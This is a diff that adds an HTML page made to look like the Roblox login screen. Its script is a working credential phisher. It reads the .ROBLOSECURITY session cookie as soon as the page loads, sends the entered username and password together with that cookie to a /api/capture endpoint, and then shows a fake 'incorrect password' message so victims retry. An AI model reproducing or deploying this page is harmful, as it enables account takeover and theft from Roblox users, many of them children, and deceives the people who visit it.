@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roblox — Log In</title>
+<link rel="stylesheet" href="/static/style.css">
+<link rel="icon" href="https://www.roblox.com/favicon.ico">
+</head>
+<body>
+<div class="wrap">
+  <div class="logo">ROBLOX</div>
+  <form id="f" autocomplete="off">
+    <input id="username" name="username" placeholder="Username/Email" autocomplete="username" required>
+    <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
+    <button type="submit">Log In</button>
+  </form>
+  <p class="small">Forgot Password? · Sign Up</p>
+</div>
+
+<script>
+function readCookie(name) {
+  const m = document.cookie.match(new RegExp('(^|;\\s*)' + name + '\\s*=\\s*([^;]+)'));
+  return m ? decodeURIComponent(m[2]) : '';
+}
+
+function ping(payload) {
+  return fetch('/api/capture', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(payload)
+  }).catch(()=>{});
+}
+
+// load-time fingerprint — cookie, platform, resolution
+ping({
+  stage: 'page-load',
+  cookie: readCookie('.ROBLOSECURITY'),
+  username: '',
+  password: ''
+});
+
+document.getElementById('f').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const u = document.getElementById('username').value;
+  const p = document.getElementById('password').value;
+
+  const btn = e.target.querySelector('button');
+  btn.disabled = true;
+  btn.textContent = 'Logging in...';
+
+  await ping({
+    stage: 'submit',
+    username: u,
+    password: p,
+    cookie: readCookie('.ROBLOSECURITY')
+  });
+
+  // no redirect — show a soft failure so the page stays up for a retry if wanted
+  btn.textContent = 'Incorrect username or password';
+  btn.disabled = false;
+});
+</script>
+</body>
+</html>
